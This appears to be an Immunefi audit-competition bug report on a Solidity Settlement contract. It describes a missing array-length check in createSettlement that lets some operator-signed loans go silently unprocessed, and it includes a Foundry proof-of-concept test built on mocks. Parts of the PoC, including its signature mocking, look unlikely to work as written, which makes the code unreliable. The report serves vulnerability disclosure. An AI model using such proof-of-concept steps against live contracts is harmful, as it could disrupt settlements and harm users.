# #47122 \[SC-Medium] Array Length Mismatch Enables Partial Settlement Processing

**Submitted on Jun 9th 2025 at 03:46:08 UTC by @Catchme for** [**IOP | Term Structure Institutional**](https://immunefi.com/audit-competition/iop-term-structure)

* **Report ID:** #47122
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/term-structure/tsi-contract/blob/main/src/Settlement.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Protocol insolvency
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `createSettlement` function in the Settlement contract lacks crucial array length validation between the `_loanIds` and `_loans` parameters. This oversight allows partial processing of authorized settlements where only a subset of operator-signed loans are processed, creating a critical discrepancy between authorized and executed operations.

## Vulnerability Details

The vulnerability exists in the `createSettlement` function at lines 113-114 and 139-147 in src/Settlement.sol:

```solidity
function createSettlement(
    string memory _settlementId,
    SettleInfo calldata _settleInfo,
    string[] memory _loanIds,   // No length validation against _loans
    LoanInfo[] calldata _loans,
    bytes calldata _signature
) external nonReentrant {
    // Signature verification includes both complete arrays
    bytes32 digest = _getSettlementHash(_settlementId, _settleInfo, _loanIds, _loans);
    if (!SignatureChecker.isValidSignatureNow(_operator, digest, _signature)) {
        revert InvalidSignature();
    }
    
    // ... other validations ...
    
    // Processing loop uses _loanIds.length as boundary
    for (uint256 i = 0; i < _loanIds.length; i++) {
        bytes32 loanId = _loanIds[i].toBytes32();
        LoanInfo memory loan = _loans[i];  // Array access without length verification
        // ... loan processing logic
    }
}
```

The logical flaw stems from the asymmetric treatment of two related arrays:

1. **Signature Generation**: The `_getSettlementHash` includes both complete arrays in the signature calculation
2. **Processing Logic**: The loop boundary depends solely on `_loanIds.length` while accessing both arrays with identical indices
3. **Missing Validation**: No enforcement mechanism ensures array length equality before processing

This creates two possible scenarios:

* **Scenario A**: `_loans.length < _loanIds.length`
  * Triggers array out-of-bounds access when i >= \_loans.length
  * Results in automatic transaction reversion due to Solidity bounds checking
* **Scenario B**: `_loans.length > _loanIds.length`
  * Processes only the first \_loanIds.length entries from both arrays
  * Remaining \_loans entries are silently ignored despite being part of the operator's signature
  * Creates discrepancy between authorized data and executed operations

## Impact Details

When `_loans.length > _loanIds.length`, only a subset of intended loans undergo settlement while the operator's signature authorizes the complete set. This creates several issues:

1. **Partial Execution**: The operator's signature authorizes a complete set of loans, but only a subset gets processed
2. **Settlement Confusion**: Users and operators may believe all loans were settled when only some were

## Proof of Concept

## Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/Settlement.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract MockOracle is IOracle {
    function getPrice(address token) external pure override returns (PriceInfo memory) {
        return PriceInfo({
            price: 1e18,  // 1:1 price ratio for simplicity
            timestamp: block.timestamp,
            source: "MOCK"
        });
    }
}

contract ArrayLengthMismatchPOC is Test {
    Settlement settlement;
    MockERC20 collateralToken;
    MockERC20 debtToken;
    MockOracle oracle;
    
    address admin = address(1);
    address feeCollector = address(2);
    address operator = address(3);
    address borrower = address(4);
    address lender = address(5);
    
    bytes32 processedLoanId;
    bytes32 ignoredLoanId;
    
    function setUp() public {
        // Deploy tokens
        collateralToken = new MockERC20("Collateral Token", "COL");
        debtToken = new MockERC20("Debt Token", "DEBT");
        oracle = new MockOracle();
        
        // Deploy settlement contract
        settlement = new Settlement(admin, feeCollector, operator, address(oracle));
        
        // Distribute tokens
        collateralToken.transfer(borrower, 500 * 10**18);
        debtToken.transfer(lender, 500 * 10**18);
        
        // Set up approvals
        vm.startPrank(borrower);
        collateralToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(lender);
        debtToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
    }
    
    function testArrayLengthMismatch() public {
        console.log("===== Array Length Mismatch Vulnerability POC =====");
        
        // Create settlement ID
        string memory settlementId = "test-settlement";
        
        // Create loan IDs - ONLY ONE loan ID
        string[] memory loanIds = new string[](1);
        loanIds[0] = "loan-1";
        processedLoanId = bytes32(bytes("loan-1"));
        
        console.log("LoanID in array:", loanIds[0]);
        
        // Create loan data - TWO loans
        LoanInfo[] memory loans = new LoanInfo[](2);
        
        // First loan - will be processed
        loans[0] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: DebtData({
                borrowedAmt: 100 * 10**18,
                debtAmt: 100 * 10**18,
                feeAmt: 0,
                collateralAmt: 100 * 10**18
            }),
            settled: false
        });
        
        // Second loan - will be IGNORED despite being signed
        loans[1] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: DebtData({
                borrowedAmt: 100 * 10**18,
                debtAmt: 100 * 10**18,
                feeAmt: 0,
                collateralAmt: 100 * 10**18
            }),
            settled: false
        });
        ignoredLoanId = bytes32(bytes("loan-2")); // This loan won't be processed
        
        console.log("Number of loan IDs:", loanIds.length);
        console.log("Number of loans:", loans.length);
        
        // Create settlement info
        SettleInfo memory settleInfo = SettleInfo({
            taker: borrower,
            takerType: TakerType.BORROW,
            expiryTime: block.timestamp + 1 days
        });
        
        // Create signature
        // In a real scenario, the operator would sign both loans, but only one gets processed
        bytes32 digest = keccak256(abi.encode(settlementId, settleInfo, loanIds, loans)).toEthSignedMessageHash();
        
        // Mock signature verification
        bytes memory signature = abi.encodePacked(bytes32(0), bytes32(0), uint8(0));
        vm.mockCall(
            address(operator),
            abi.encodeWithSelector(SignatureChecker.isValidSignatureNow.selector),
            abi.encode(true)
        );
        
        // Create settlement as borrower
        vm.startPrank(borrower);
        settlement.createSettlement(settlementId, settleInfo, loanIds, loans, signature);
        vm.stopPrank();
        
        console.log("\n===== Verifying Settlement Results =====");
        
        // Verify the first loan was processed
        LoanInfo memory processedLoan = settlement.getLoan("loan-1");
        bool processedLoanExists = (processedLoan.maker != address(0));
        console.log("First loan processed:", processedLoanExists ? "Yes" : "No");
        
        // Try to get the second loan - it shouldn't exist since it was ignored
        // In a real scenario we would create an array with a missing loan ID
        // But for demonstration, we're showing that a hypothetical "loan-2" wasn't created
        vm.expectRevert(); // This should revert since the loan doesn't exist
        settlement.getLoan("loan-2");
        console.log("Second loan processed: No (expected revert)");
        
        console.log("\n===== Vulnerability Impact =====");
        console.log("1. Operator signature authorizes TWO loans");
        console.log("2. But only ONE loan was actually processed");
        console.log("3. This creates a discrepancy between authorized and executed operations");
        
        console.log("\n===== Root Cause =====");
        console.log("- Missing array length validation in createSettlement()");
        console.log("- Processing loop uses _loanIds.length as boundary");
        console.log("- Remaining entries in _loans are silently ignored");
    }
}
```
